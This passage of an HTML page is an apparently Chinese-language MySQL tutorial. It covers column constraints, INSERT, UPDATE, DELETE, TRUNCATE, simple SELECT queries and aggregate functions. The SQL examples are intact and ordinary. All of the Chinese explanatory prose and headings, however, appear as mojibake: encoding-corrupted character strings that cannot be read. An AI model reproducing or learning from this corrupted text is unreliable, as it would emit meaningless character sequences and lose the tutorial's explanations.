<p>é»˜è®¤å€¼çº¦æŸå³DEFAULTç”¨äºç»™æ•°æ®è¡¨ä¸­çš„å­—æ®µæŒ‡å®šé»˜è®¤å€¼ï¼Œå³å½“åœ¨è¡¨ä¸­æ’å…¥ä¸€æ¡æ–°è®°å½•æ—¶è‹¥æœªç»™è¯¥å­—æ®µèµ‹å€¼ï¼Œé‚£ä¹ˆï¼Œæ•°æ®åº“ç³»ç»Ÿä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªå­—æ®µæ’å…¥é»˜è®¤å€¼ï¼›å…¶åŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å­—æ®µå æ•°æ®ç±»å‹ <span class="keyword">DEFAULT</span> é»˜è®¤å€¼ï¼›</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>é»˜è®¤å€¼çº¦æŸç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student03(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">default</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="å”¯ä¸€æ€§çº¦æŸ">å”¯ä¸€æ€§çº¦æŸ</h3>
<p>å”¯ä¸€æ€§çº¦æŸå³UNIQUEç”¨äºä¿è¯æ•°æ®è¡¨ä¸­å­—æ®µçš„å”¯ä¸€æ€§ï¼Œå³è¡¨ä¸­å­—æ®µçš„å€¼ä¸èƒ½é‡å¤å‡ºç°ï¼Œå…¶åŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">å­—æ®µå æ•°æ®ç±»å‹ UNIQUE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>å”¯ä¸€æ€§çº¦æŸç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student04(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="å¤–é”®çº¦æŸ">å¤–é”®çº¦æŸ</h3>
<h4 id="å¤–é”®çº¦æŸçš„åˆ›å»º">å¤–é”®çº¦æŸçš„åˆ›å»º</h4>
<p>å¤–é”®çº¦æŸå³FOREIGN KEYå¸¸ç”¨äºå¤šå¼ è¡¨ä¹‹é—´çš„çº¦æŸã€‚åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åœ¨åˆ›å»ºæ•°æ®è¡¨æ—¶è¯­æ³•å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="keyword">CONSTRAINT</span> å¤–é”®å <span class="keyword">FOREIGN</span> KEY (ä»è¡¨å¤–é”®å­—æ®µ) <span class="keyword">REFERENCES</span> ä¸»è¡¨ (ä¸»é”®å­—æ®µ)</span><br><span class="line"><span class="comment">-- å°†åˆ›å»ºæ•°æ®è¡¨åˆ›å·åè¯­æ³•å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> ä»è¡¨å <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> å¤–é”®å <span class="keyword">FOREIGN</span> KEY (ä»è¡¨å¤–é”®å­—æ®µ) <span class="keyword">REFERENCES</span> ä¸»è¡¨ (ä¸»é”®å­—æ®µ);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>å¤–é”®çº¦æŸç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ›å»ºä¸€ä¸ªå­¦ç”Ÿè¡¨</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student05(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>åˆ›å»ºä¸€ä¸ªç­çº§è¡¨</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> class(</span><br><span class="line">classid <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">studentid <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>å­¦ç”Ÿè¡¨ä½œä¸ºä¸»è¡¨ï¼Œç­çº§è¡¨ä½œä¸ºå‰¯è¡¨è®¾ç½®å¤–é”®</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">add</span> <span class="keyword">constraint</span> fk_class_studentid <span class="keyword">foreign</span> key(studentid) <span class="keyword">references</span> student05(id);</span><br></pre></td></tr></table></figure>
<p>å¯é€šè¿‡<code>show create table class;</code>å‘½ä»¤æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ã€‚</p>
<h4 id="å¤–é”®çº¦æŸçš„è¯¦ç»†æ“ä½œ">å¤–é”®çº¦æŸçš„è¯¦ç»†æ“ä½œ</h4>
<ol>
<li class="lvl-3">
<p>æ•°æ®ä¸€è‡´æ€§æ¦‚å¿µ</p>
</li>
</ol>
<p>å¤§å®¶çŸ¥é“ï¼šå»ºç«‹å¤–é”®æ˜¯ä¸ºäº†ä¿è¯æ•°æ®çš„å®Œæ•´å’Œç»Ÿä¸€æ€§ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸»è¡¨ä¸­çš„æ•°æ®è¢«åˆ é™¤æˆ–ä¿®æ”¹ä»è¡¨ä¸­å¯¹åº”çš„æ•°æ®è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå¾ˆæ˜æ˜¾ï¼Œä»è¡¨ä¸­å¯¹åº”çš„æ•°æ®ä¹Ÿåº”è¯¥è¢«åˆ é™¤ï¼Œå¦åˆ™æ•°æ®åº“ä¸­ä¼šå­˜åœ¨å¾ˆå¤šæ— æ„ä¹‰çš„åƒåœ¾æ•°æ®ã€‚</p>
<ol start="2">
<li class="lvl-3">
<p>åˆ é™¤å¤–é”®</p>
</li>
</ol>
<p>è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> ä»è¡¨å <span class="keyword">drop</span> <span class="keyword">foreign</span> key å¤–é”®åï¼›</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ä¸­åˆ é™¤å¤–é”®çš„å‘½ä»¤ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> class <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_class_studentid;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>å…³äºå¤–é”®çº¦æŸéœ€è¦æ³¨æ„çš„ç»†èŠ‚</p>
<ol>
<li class="lvl-6">ä»è¡¨é‡Œçš„å¤–é”®é€šå¸¸ä¸ºä¸»è¡¨çš„ä¸»é”®</li>
<li class="lvl-6">ä»è¡¨é‡Œå¤–é”®çš„æ•°æ®ç±»å‹å¿…é¡»ä¸ä¸»è¡¨ä¸­ä¸»é”®çš„æ•°æ®ç±»å‹ä¸€è‡´</li>
<li class="lvl-6">ä¸»è¡¨å‘ç”Ÿå˜åŒ–æ—¶åº”æ³¨æ„ä¸»è¡¨ä¸ä»è¡¨çš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜</li>
</ol>
</li>
</ol>
<h2 id="æ•°æ®è¡¨æ’å…¥æ•°æ®">æ•°æ®è¡¨æ’å…¥æ•°æ®</h2>
<p>åœ¨MySQLé€šè¿‡INSERTè¯­å¥å‘æ•°æ®è¡¨ä¸­æ’å…¥æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€å¼ å­¦ç”Ÿè¡¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">age <span class="type">int</span>,</span><br><span class="line">gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>å‘æ•°æ®è¡¨ä¸­æ’å…¥æ•°æ®æ—¶ï¼Œæ¯ä¸ªå­—æ®µä¸å…¶å€¼æ˜¯ä¸¥æ ¼ä¸€ä¸€å¯¹åº”çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯ä¸ªå€¼ã€å€¼çš„é¡ºåºã€å€¼çš„ç±»å‹å¿…é¡»ä¸å¯¹åº”çš„å­—æ®µç›¸åŒ¹é…ã€‚ä½†æ˜¯ï¼Œå„å­—æ®µæ— é¡»ä¸å…¶åœ¨è¡¨ä¸­å®šä¹‰çš„é¡ºåºä¸€è‡´ï¼Œå®ƒä»¬åªè¦ä¸ VALUESä¸­å€¼çš„é¡ºåºä¸€è‡´å³å¯ã€‚åŒæ—¶ï¼Œæ’å…¥æ•°æ®çš„æ–¹æ³•å’Œä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®ä¸€æ ·ï¼Œåªæ˜¯éœ€è¦æ’å…¥çš„å­—æ®µç”±ä½ è‡ªå·±æŒ‡å®šã€‚è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> è¡¨åï¼ˆå­—æ®µå<span class="number">1</span>,å­—æ®µå<span class="number">2</span>,...) <span class="keyword">VALUES</span> (å€¼ <span class="number">1</span>,å€¼ <span class="number">2</span>,...);</span><br></pre></td></tr></table></figure>
<p>å‘è¡¨ä¸­æ’å…¥å¤šæ¡æ•°æ®çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> è¡¨å [(å­—æ®µå<span class="number">1</span>,å­—æ®µå<span class="number">2</span>,...)]<span class="keyword">VALUES</span> (å€¼ <span class="number">1</span>,å€¼ <span class="number">2</span>,â€¦),(å€¼ <span class="number">1</span>,å€¼ <span class="number">2</span>,â€¦),...;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¯¥æ–¹å¼ä¸­ï¼š(å­—æ®µå1,å­—æ®µå2,â€¦)æ˜¯å¯é€‰çš„ï¼Œå®ƒç”¨äºæŒ‡å®šæ’å…¥çš„å­—æ®µåï¼›(å€¼ 1,å€¼ 2,â€¦),(å€¼ 1,å€¼ 2,â€¦)è¡¨ç¤ºè¦æ’å…¥çš„è®°å½•ï¼Œè¯¥è®°å½•å¯æœ‰å¤šæ¡å¹¶ä¸”æ¯æ¡è®°å½•ä¹‹é—´ç”¨é€—å·éš”å¼€ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><figcaption><span>å‘è¡¨ä¸­æ’å…¥å¤šæ¡æ•°æ®ç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="æ›´æ–°æ•°æ®">æ›´æ–°æ•°æ®</h2>
<p>åœ¨MySQLé€šè¿‡UPDATEè¯­å¥æ›´æ–°æ•°æ®è¡¨ä¸­çš„æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å°†å°±ç”¨å…­ä¸­çš„studentå­¦ç”Ÿè¡¨</p>
<ol>
<li class="lvl-3">
<p>UPDATEçš„åŸºæœ¬è¯­æ³•ä¸ºï¼š</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> è¡¨å <span class="keyword">SET</span> å­—æ®µå<span class="number">1</span><span class="operator">=</span>å€¼<span class="number">1</span>[,å­—æ®µå<span class="number">2</span> <span class="operator">=</span>å€¼<span class="number">2</span>,â€¦] [<span class="keyword">WHERE</span> æ¡ä»¶è¡¨è¾¾å¼];</span><br></pre></td></tr></table></figure>
<p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šå­—æ®µå1ã€å­—æ®µå2â€¦ç”¨äºæŒ‡å®šè¦æ›´æ–°çš„å­—æ®µåç§°ï¼›å€¼1ã€å€¼ 2â€¦ç”¨äºè¡¨ç¤ºå­—æ®µçš„æ–°æ•°æ®ï¼›WHERE æ¡ä»¶è¡¨è¾¾å¼ æ˜¯å¯é€‰çš„ï¼Œå®ƒç”¨äºæŒ‡å®šæ›´æ–°æ•°æ®éœ€è¦æ»¡è¶³çš„æ¡ä»¶</p>
<ol start="2">
<li class="lvl-3">
<p>UPDATEæ›´æ–°éƒ¨åˆ†æ•°æ®</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å°†nameä¸ºtomçš„è®°å½•çš„ageè®¾ç½®ä¸º<span class="number">20</span>å¹¶å°†å…¶genderè®¾ç½®ä¸ºfemale</span><br><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">20</span>,gender<span class="operator">=</span><span class="string">&#x27;female&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;tom&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>UPDATEæ›´æ–°å…¨éƒ¨æ•°æ®</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> student <span class="keyword">set</span> age<span class="operator">=</span><span class="number">18</span>;</span><br></pre></td></tr></table></figure>
<h2 id="åˆ é™¤æ•°æ®">åˆ é™¤æ•°æ®</h2>
<p>åœ¨MySQLé€šè¿‡DELETEè¯­å¥åˆ é™¤æ•°æ®è¡¨ä¸­çš„æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€å¼ æ•°æ®è¡¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»ºå­¦ç”Ÿè¡¨</span></span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line"> age <span class="type">int</span>,</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">30</span>)</span><br><span class="line"> );</span><br><span class="line"> <span class="comment">-- æ’å…¥æ•°æ®</span></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> student (id,name,age,gender) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">17</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;jack&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">4</span>,<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>),(<span class="number">5</span>,<span class="string">&#x27;sal&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">6</span>,<span class="string">&#x27;sun&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;male&#x27;</span>)</span><br><span class="line">,(<span class="number">7</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="number">13</span>,<span class="string">&#x27;female&#x27;</span>),(<span class="number">8</span>,<span class="string">&#x27;sam&#x27;</span>,<span class="number">14</span>,<span class="string">&#x27;male&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>DELETEåŸºæœ¬è¯­æ³•</p>
</li>
</ol>
<p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šè¡¨åç”¨äºæŒ‡å®šè¦æ‰§è¡Œåˆ é™¤æ“ä½œçš„è¡¨ï¼›[WHERE æ¡ä»¶è¡¨è¾¾å¼]ä¸ºå¯é€‰å‚æ•°ç”¨äºæŒ‡å®šåˆ é™¤çš„æ¡ä»¶ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> è¡¨å [<span class="keyword">WHERE</span> æ¡ä»¶è¡¨è¾¾å¼];</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>DELETEåˆ é™¤éƒ¨åˆ†æ•°æ®</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åˆ é™¤ageç­‰äº<span class="number">14</span>çš„æ‰€æœ‰è®°å½•</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> age<span class="operator">=</span><span class="number">14</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>DELETEåˆ é™¤å…¨éƒ¨æ•°æ®</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åˆ é™¤studentè¡¨ä¸­çš„æ‰€æœ‰è®°å½•</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>TRUNCATEä¸DELETEçš„åŒºåˆ«</p>
</li>
</ol>
<p>TRUNCATEå’ŒDELETEéƒ½èƒ½å®ç°åˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®çš„åŠŸèƒ½ï¼Œä½†ä¸¤è€…ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼š<br>
1ã€DELETEè¯­å¥åå¯è·ŸWHEREå­å¥ï¼Œå¯é€šè¿‡æŒ‡å®šWHEREå­å¥ä¸­çš„æ¡ä»¶è¡¨è¾¾å¼åªåˆ é™¤æ»¡è¶³æ¡ä»¶çš„éƒ¨åˆ†è®°å½•ï¼›ä½†æ˜¯ï¼ŒTRUNCATEè¯­å¥åªèƒ½ç”¨äºåˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰è®°å½•ã€‚<br>
2ã€ä½¿ç”¨TRUNCATEè¯­å¥åˆ é™¤è¡¨ä¸­çš„æ•°æ®åï¼Œå†æ¬¡å‘è¡¨ä¸­æ·»åŠ è®°å½•æ—¶è‡ªåŠ¨å¢åŠ å­—æ®µçš„é»˜è®¤åˆå§‹å€¼é‡æ–°ç”±1å¼€å§‹ï¼›ä½¿ç”¨DELETEè¯­å¥åˆ é™¤è¡¨ä¸­æ‰€æœ‰è®°å½•åï¼Œå†æ¬¡å‘è¡¨ä¸­æ·»åŠ è®°å½•æ—¶è‡ªåŠ¨å¢åŠ å­—æ®µçš„å€¼ä¸ºåˆ é™¤æ—¶è¯¥å­—æ®µçš„æœ€å¤§å€¼åŠ 1<br>
3ã€DELETEè¯­å¥æ˜¯DMLè¯­å¥ï¼ŒTRUNCATEè¯­å¥é€šå¸¸è¢«è®¤ä¸ºæ˜¯DDLè¯­å¥</p>
<h2 id="ç®€å•æŸ¥è¯¢">ç®€å•æŸ¥è¯¢</h2>
<p>ç®€å•æŸ¥è¯¢å³ä¸å«whereçš„selectè¯­å¥ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬è®²è§£ç®€å•æŸ¥è¯¢ä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§æŸ¥è¯¢ï¼šæŸ¥è¯¢æ‰€æœ‰å­—æ®µå’ŒæŸ¥è¯¢æŒ‡å®šå­—æ®µã€‚åœ¨æ­¤ï¼Œå…ˆå‡†å¤‡æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºstudentè¡¨</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">    sid <span class="type">CHAR</span>(<span class="number">6</span>),</span><br><span class="line">    sname <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;male&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å‘studentè¡¨æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1001&#x27;</span>, <span class="string">&#x27;lili&#x27;</span>, <span class="number">14</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1002&#x27;</span>, <span class="string">&#x27;wang&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1003&#x27;</span>, <span class="string">&#x27;tywd&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1004&#x27;</span>, <span class="string">&#x27;hfgs&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1005&#x27;</span>, <span class="string">&#x27;qwer&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1006&#x27;</span>, <span class="string">&#x27;zxsd&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1007&#x27;</span>, <span class="string">&#x27;hjop&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1008&#x27;</span>, <span class="string">&#x27;tyop&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1009&#x27;</span>, <span class="string">&#x27;nhmk&#x27;</span>, <span class="number">13</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student (sid,sname,age,gender) <span class="keyword">VALUES</span> (<span class="string">&#x27;S_1010&#x27;</span>, <span class="string">&#x27;xdfv&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;female&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>æ•°æ®è¡¨ç®€å•æŸ¥è¯¢ç¤ºä¾‹</p>
<figure class="highlight sql"><figcaption><span>æ•°æ®è¡¨ç®€å•æŸ¥è¯¢ç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>æŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼ˆæ–¹æ³•ä¸å”¯ä¸€ï¼‰</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰</span><br><span class="line"><span class="keyword">select</span> sid,sname <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>å¸¸æ•°çš„æŸ¥è¯¢ï¼ˆæ—¥æœŸæ ‡è®°ï¼‰</span><br><span class="line"><span class="keyword">select</span> sid,sname,<span class="string">&#x27;2021-03-02&#x27;</span> <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>ä»æŸ¥è¯¢ç»“æœä¸­è¿‡æ»¤é‡å¤æ•°æ®</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> gender <span class="keyword">from</span> student;</span><br><span class="line">æ³¨ï¼š åœ¨<span class="keyword">SELECT</span>æŸ¥è¯¢è¯­å¥ä¸­<span class="keyword">DISTINCT</span>å…³é”®å­—åªèƒ½ç”¨åœ¨ç¬¬ä¸€ä¸ªæ‰€æŸ¥åˆ—åä¹‹å‰</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>ç®—æœ¯è¿ç®—ç¬¦</span><br><span class="line"> <span class="keyword">select</span> sname,age<span class="operator">+</span><span class="number">10</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="å‡½æ•°">å‡½æ•°</h2>
<h3 id="èšåˆå‡½æ•°">èšåˆå‡½æ•°</h3>
<p>åœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸æœ‰ç±»ä¼¼çš„éœ€æ±‚ï¼šç»Ÿè®¡æŸä¸ªå­—æ®µçš„æœ€å¤§å€¼ã€æœ€å°å€¼ã€ å¹³å‡å€¼ç­‰ç­‰ã€‚ä¸ºæ­¤ï¼ŒMySQLä¸­æä¾›äº†èšåˆå‡½æ•°æ¥å®ç°è¿™äº›åŠŸèƒ½ã€‚æ‰€è°“èšåˆï¼Œå°±æ˜¯å°†å¤šè¡Œæ±‡æ€»æˆä¸€è¡Œï¼›å…¶å®ï¼Œæ‰€æœ‰çš„èšåˆå‡½æ•°å‡å¦‚æ­¤â€”â€”è¾“å…¥å¤šè¡Œï¼Œè¾“å‡ºä¸€è¡Œã€‚èšåˆå‡½æ•°å…·æœ‰è‡ªåŠ¨æ»¤ç©ºçš„åŠŸèƒ½ï¼Œè‹¥æŸä¸€ä¸ªå€¼ä¸ºNULLï¼Œé‚£ä¹ˆä¼šè‡ªåŠ¨å°†å…¶è¿‡æ»¤ä½¿å…¶ä¸å‚ä¸è¿ç®—ã€‚</p>
<p><strong>èšåˆå‡½æ•°ä½¿ç”¨è§„åˆ™ï¼š</strong><br>
åªæœ‰SELECTå­å¥å’ŒHAVINGå­å¥ã€ORDER BYå­å¥ä¸­èƒ½å¤Ÿä½¿ç”¨èšåˆå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåœ¨WHEREå­å¥ä¸­ä½¿ç”¨èšåˆå‡½æ•°æ˜¯é”™è¯¯çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å­¦ä¹ å¸¸ç”¨èšåˆå‡½æ•°ã€‚</p>
<ol>
<li class="lvl-3">
<p>count()</p>
</li>
</ol>
<p>ç»Ÿè®¡è¡¨ä¸­æ•°æ®çš„è¡Œæ•°æˆ–è€…ç»Ÿè®¡æŒ‡å®šåˆ—å…¶å€¼ä¸ä¸ºNULLçš„æ•°æ®ä¸ªæ•°</p>
<p><em>æŸ¥è¯¢æœ‰å¤šå°‘è¯¥è¡¨ä¸­æœ‰å¤šå°‘äºº</em></p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>max()</p>
</li>
</ol>
<p>è®¡ç®—æŒ‡å®šåˆ—çš„æœ€å¤§å€¼ï¼Œå¦‚æœæŒ‡å®šåˆ—æ˜¯å­—ç¬¦ä¸²ç±»å‹åˆ™ä½¿ç”¨å­—ç¬¦ä¸²æ’åºè¿ç®—</p>
<p><em>æŸ¥è¯¢è¯¥å­¦ç”Ÿè¡¨ä¸­å¹´çºªæœ€å¤§çš„å­¦ç”Ÿ</em></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">max</span>(<span class="params">age</span>) <span class="keyword">from</span> student</span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
